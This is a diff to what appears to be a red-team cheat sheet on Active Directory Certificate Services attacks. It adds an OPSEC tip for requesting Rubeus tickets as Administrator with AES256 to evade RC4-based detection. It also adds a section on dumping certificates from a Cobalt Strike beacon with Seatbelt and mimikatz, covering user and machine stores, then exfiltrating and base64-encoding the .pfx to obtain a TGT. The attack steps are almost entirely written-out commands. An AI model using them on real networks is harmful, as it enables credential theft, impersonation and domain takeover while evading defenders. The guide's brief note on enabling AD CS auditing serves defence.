@@ -62,8 +62,10 @@ cat cert.pfx | base64 -w 0
 And finally we can use `Rubeus` to request a TGT.
 
 ```
-.\Rubeus asktgt /user:Administrator /certificate:<B64-CERT> /password:certificate-password /nowrap
+.\Rubeus asktgt /user:Administrator /certificate:<B64-CERT> /password:certificate-password /enctype:aes256 /nowrap
 ```
+
+> **OPSEC Alert**: Use `/enctype:aes256` parameter to use AES256 and avoid RC4.
 
 # NTLM Relaying to ADCS HTTP Endpoints
 
@@ -118,3 +120,45 @@ Similar to User, machines are a special type of user in AD and can have their ow
 AD CS logging is not enabled by default, so it is unsurprisingly common for defenders to be blind to this activity in their domain.
 
 `Audit Certification Services` must also be enalbed via GPO to `Success` or `Failure` depending on the tolerance of the organization.
+
+
+# Dumping Certificates
+
+To enumerate certificates use `Seatbelt`.
+
+```
+beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates
+```
+
+> **Note**: Ensure that the certificate is **used for authentication**.
+
+We can dump certificates with mimikatz.
+
+* For users:
+
+```
+beacon> mimikatz crypto::certificates /export
+```
+
+* For machines:
+
+```
+beacon> mimikatz !crypto::certificates /systemstore:local_machine /export
+```
+
+> **NOTE**: Mimikatz always export certificates with `mimikatz` as password.
+
+Download the file and sync files from cobalt strike to your local machine.
+
+```
+beacon> download C:\Users\user\CURRENT_USER_My_0_User Example.pfx
+```
+
+> **Note** : Go to `View -> Downloads` to sync files.
+
+Encode in base64 the `.pfx` file.
+
+```
+cat CURRENT_USER_My_0_User\ Example.pfx | base64 -w0
+```
+And finally use it to request a TGT.
